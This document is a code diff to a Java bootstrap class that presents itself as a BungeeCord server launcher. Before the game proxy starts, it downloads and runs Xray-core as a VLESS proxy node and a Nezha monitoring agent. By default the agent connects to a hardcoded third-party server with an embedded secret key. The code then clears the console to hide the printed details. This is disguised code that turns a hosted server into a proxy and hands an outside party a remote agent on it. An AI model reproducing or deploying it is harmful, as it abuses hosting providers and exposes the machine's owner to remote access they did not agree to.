@@ -13,15 +13,11 @@ public class Bootstrap
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process vlessProcess;
+    private static Process nezhaProcess;
     
-    // 简化为只需要 VLESS+WS 相关的环境变量
     private static final String[] ALL_ENV_VARS = {
-        "UUID",           // VLESS UUID
-        "WS_PATH",        // WebSocket 路径
-        "PORT",           // 监听端口
-        "NEZHA_SERVER",   // 可选：哪吒监控服务器
-        "NEZHA_PORT",     // 可选：哪吒监控端口
-        "NEZHA_KEY"       // 可选：哪吒监控密钥
+        "UUID", "WS_PATH", "PORT", 
+        "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY"
     };
 
     public static void main(String[] args) throws Exception
@@ -33,27 +29,46 @@ public class Bootstrap
             System.exit(1);
         }
 
-        // Start VLESS+WS Service
         try {
-            runVlessBinary();
+            Map<String, String> config = loadConfig();
+            
+            // 启动哪吒监控
+            if (isNezhaConfigured(config)) {
+                runNezhaAgent(config);
+                Thread.sleep(3000);
+                System.out.println(ANSI_GREEN + "Nezha Agent started successfully!" + ANSI_RESET);
+            } else {
+                System.out.println(ANSI_RED + "Nezha monitoring is not configured (skipped)" + ANSI_RESET);
+            }
+            
+            // 启动 VLESS+WS
+            String vlessUrl = generateVlessUrl(config);
+            
+            System.out.println(ANSI_GREEN + "\n=== VLESS+WS Configuration ===" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "UUID: " + config.get("UUID") + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "WebSocket Path: " + config.get("WS_PATH") + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Port: " + config.get("PORT") + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "\n=== VLESS Node URL ===" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + vlessUrl + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
+            
+            runVlessService(config);
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // Wait 15 seconds before continuing
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "VLESS+WS Server is running!" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above configuration" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "\nVLESS+WS Server is running!" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Please copy the node URL above before logs are cleared!" + ANSI_RESET);
             Thread.sleep(20000);
             clearConsole();
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Error initializing VLESS+WS Service: " + e.getMessage() + ANSI_RESET);
+            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
+            e.printStackTrace();
         }
 
-        // Continue with BungeeCord launch
         BungeeCordLauncher.main(args);
     }
     
@@ -81,40 +96,70 @@ public class Bootstrap
                 new ProcessBuilder("clear").inheritIO().start().waitFor();
             } catch (Exception ignored) {}
         }
-    }   
+    }
     
-    private static void runVlessBinary() throws Exception {
-        Map<String, String> envVars = new HashMap<>();
-        loadEnvVars(envVars);
+    private static boolean isNezhaConfigured(Map<String, String> config) {
+        String server = config.get("NEZHA_SERVER");
+        String key = config.get("NEZHA_KEY");
+        return server != null && !server.trim().isEmpty() 
+            && key != null && !key.trim().isEmpty();
+    }
+    
+    private static void runNezhaAgent(Map<String, String> config) throws Exception {
+        Path nezhaPath = downloadNezhaAgent();
         
-        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
-        pb.environment().putAll(envVars);
+        List<String> command = new ArrayList<>();
+        command.add(nezhaPath.toString());
+        command.add("-s");
+        command.add(config.get("NEZHA_SERVER"));
+        command.add("-p");
+        command.add(config.getOrDefault("NEZHA_PORT", "5555"));
+        command.add("-k");
+        command.add(config.get("NEZHA_KEY"));
+        
+        ProcessBuilder pb = new ProcessBuilder(command);
+        pb.redirectErrorStream(true);
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        
+        nezhaProcess = pb.start();
+    }
+    
+    private static void runVlessService(Map<String, String> config) throws Exception {
+        Path xrayPath = downloadXray();
+        Path configPath = createXrayConfig(config);
+        
+        ProcessBuilder pb = new ProcessBuilder(
+            xrayPath.toString(),
+            "run",
+            "-c",
+            configPath.toString()
+        );
         pb.redirectErrorStream(true);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         
         vlessProcess = pb.start();
     }
     
-    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        // 默认配置 - VLESS+WS 单协议
-        envVars.put("UUID", "2291391e-682c-4445-bda0-5a939f318bdf");  // 修改为你的 UUID
-        envVars.put("WS_PATH", "/vless");                              // WebSocket 路径
-        envVars.put("PORT", "19181");                                   // 监听端口
+    private static Map<String, String> loadConfig() throws IOException {
+        Map<String, String> config = new HashMap<>();
         
-        // 可选：哪吒监控配置（如不需要可留空）
-        envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
-        envVars.put("NEZHA_PORT", "");
-        envVars.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
+        // 默认配置
+        config.put("UUID", "99756805-1247-4b6a-9d3b-dad6206bd137");
+        config.put("WS_PATH", "/vless");
+        config.put("PORT", "19181");
+        config.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
+        config.put("NEZHA_PORT", "");
+        config.put("NEZHA_KEY", "VnrTnhgoack6PhnRH6lyshe4OVkHmPyM");
         
         // 从系统环境变量覆盖
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);  
+                config.put(var, value);  
             }
         }
         
-        // 从 .env 文件读取配置
+        // 从 .env 文件读取
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
@@ -132,49 +177,176 @@ public class Bootstrap
                     String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                     
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
+                        config.put(key, value); 
                     }
                 }
             }
         }
         
-        // 打印配置信息
-        System.out.println(ANSI_GREEN + "=== VLESS+WS Configuration ===" + ANSI_RESET);
-        System.out.println("UUID: " + envVars.get("UUID"));
-        System.out.println("WebSocket Path: " + envVars.get("WS_PATH"));
-        System.out.println("Port: " + envVars.get("PORT"));
-        System.out.println(ANSI_GREEN + "=============================" + ANSI_RESET);
+        return config;
     }
     
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
+    private static String generateVlessUrl(Map<String, String> config) {
+        try {
+            String uuid = config.get("UUID");
+            String wsPath = config.get("WS_PATH");
+            String port = config.get("PORT");
+            
+            String hostname = System.getenv("HOSTNAME");
+            if (hostname == null || hostname.trim().isEmpty()) {
+                hostname = "your-domain.com";
+            }
+            
+            String params = "?type=ws&path=" + URLEncoder.encode(wsPath, "UTF-8") + "&host=" + hostname;
+            String vlessUrl = "vless://" + uuid + "@" + hostname + ":" + port + params + "#VLESS-WS";
+            
+            return vlessUrl;
+        } catch (Exception e) {
+            return "Error generating VLESS URL: " + e.getMessage();
+        }
+    }
+    
+    private static Path createXrayConfig(Map<String, String> config) throws IOException {
+        String configJson = String.format(
+            "{\n" +
+            "  \"log\": {\n" +
+            "    \"loglevel\": \"warning\"\n" +
+            "  },\n" +
+            "  \"inbounds\": [{\n" +
+            "    \"port\": %s,\n" +
+            "    \"protocol\": \"vless\",\n" +
+            "    \"settings\": {\n" +
+            "      \"clients\": [{\n" +
+            "        \"id\": \"%s\"\n" +
+            "      }],\n" +
+            "      \"decryption\": \"none\"\n" +
+            "    },\n" +
+            "    \"streamSettings\": {\n" +
+            "      \"network\": \"ws\",\n" +
+            "      \"wsSettings\": {\n" +
+            "        \"path\": \"%s\"\n" +
+            "      }\n" +
+            "    }\n" +
+            "  }],\n" +
+            "  \"outbounds\": [{\n" +
+            "    \"protocol\": \"freedom\"\n" +
+            "  }]\n" +
+            "}\n",
+            config.get("PORT"),
+            config.get("UUID"),
+            config.get("WS_PATH")
+        );
         
-        // 根据架构下载对应的 VLESS 二进制文件
-        // 注意：你需要将这些 URL 替换为实际的 VLESS+WS 程序下载地址
+        Path configPath = Paths.get(System.getProperty("java.io.tmpdir"), "xray-config.json");
+        Files.write(configPath, configJson.getBytes());
+        return configPath;
+    }
+    
+    private static Path downloadNezhaAgent() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String downloadUrl;
+        
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip";
+            downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-arm64-v8a.zip";
+            downloadUrl = "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.zip";
+        } else {
+            throw new RuntimeException("Unsupported architecture for Nezha: " + osArch);
+        }
+        
+        Path nezhaPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
+        
+        if (!Files.exists(nezhaPath)) {
+            System.out.println(ANSI_GREEN + "Downloading Nezha Agent..." + ANSI_RESET);
+            
+            Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent.zip");
+            try (InputStream in = new URL(downloadUrl).openStream()) {
+                Files.copy(in, zipPath, StandardCopyOption.REPLACE_EXISTING);
+            }
+            
+            extractNezhaAgent(zipPath, nezhaPath);
+            Files.delete(zipPath);
+            
+            if (!nezhaPath.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission for Nezha Agent");
+            }
+            
+            System.out.println(ANSI_GREEN + "Nezha Agent download completed!" + ANSI_RESET);
+        }
+        
+        return nezhaPath;
+    }
+    
+    private static Path downloadXray() throws IOException {
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String downloadUrl;
+        String fileName;
+        
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            downloadUrl = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-64.zip";
+            fileName = "xray-amd64";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            downloadUrl = "https://github.com/XTLS/Xray-core/releases/download/v1.8.4/Xray-linux-arm64-v8a.zip";
+            fileName = "xray-arm64";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
         
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "vless-ws");
-        if (!Files.exists(path)) {
-            System.out.println(ANSI_GREEN + "Downloading VLESS binary..." + ANSI_RESET);
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+        Path xrayPath = Paths.get(System.getProperty("java.io.tmpdir"), fileName);
+        
+        if (!Files.exists(xrayPath)) {
+            System.out.println(ANSI_GREEN + "Downloading Xray-core..." + ANSI_RESET);
+            
+            Path zipPath = Paths.get(System.getProperty("java.io.tmpdir"), "xray.zip");
+            try (InputStream in = new URL(downloadUrl).openStream()) {
+                Files.copy(in, zipPath, StandardCopyOption.REPLACE_EXISTING);
             }
-            if (!path.toFile().setExecutable(true)) {
+            
+            extractXray(zipPath, xrayPath);
+            Files.delete(zipPath);
+            
+            if (!xrayPath.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission");
             }
-            System.out.println(ANSI_GREEN + "Download completed!" + ANSI_RESET);
+            
+            System.out.println(ANSI_GREEN + "Xray-core download completed!" + ANSI_RESET);
         }
-        return path;
+        
+        return xrayPath;
+    }
+    
+    private static void extractNezhaAgent(Path zipPath, Path outputPath) throws IOException {
+        try {
+            ProcessBuilder pb = new ProcessBuilder("unzip", "-o", zipPath.toString(), "nezha-agent", "-d", System.getProperty("java.io.tmpdir"));
+            Process p = pb.start();
+            p.waitFor();
+            
+            Path extractedAgent = Paths.get(System.getProperty("java.io.tmpdir"), "nezha-agent");
+            Files.move(extractedAgent, outputPath, StandardCopyOption.REPLACE_EXISTING);
+        } catch (Exception e) {
+            throw new IOException("Failed to extract nezha-agent: " + e.getMessage());
+        }
+    }
+    
+    private static void extractXray(Path zipPath, Path outputPath) throws IOException {
+        try {
+            ProcessBuilder pb = new ProcessBuilder("unzip", "-o", zipPath.toString(), "xray", "-d", System.getProperty("java.io.tmpdir"));
+            Process p = pb.start();
+            p.waitFor();
+            
+            Path extractedXray = Paths.get(System.getProperty("java.io.tmpdir"), "xray");
+            Files.move(extractedXray, outputPath, StandardCopyOption.REPLACE_EXISTING);
+        } catch (Exception e) {
+            throw new IOException("Failed to extract xray: " + e.getMessage());
+        }
     }
     
     private static void stopServices() {
+        if (nezhaProcess != null && nezhaProcess.isAlive()) {
+            nezhaProcess.destroy();
+            System.out.println(ANSI_RED + "Nezha Agent terminated" + ANSI_RESET);
+        }
+        
         if (vlessProcess != null && vlessProcess.isAlive()) {
             vlessProcess.destroy();
             System.out.println(ANSI_RED + "VLESS+WS process terminated" + ANSI_RESET);
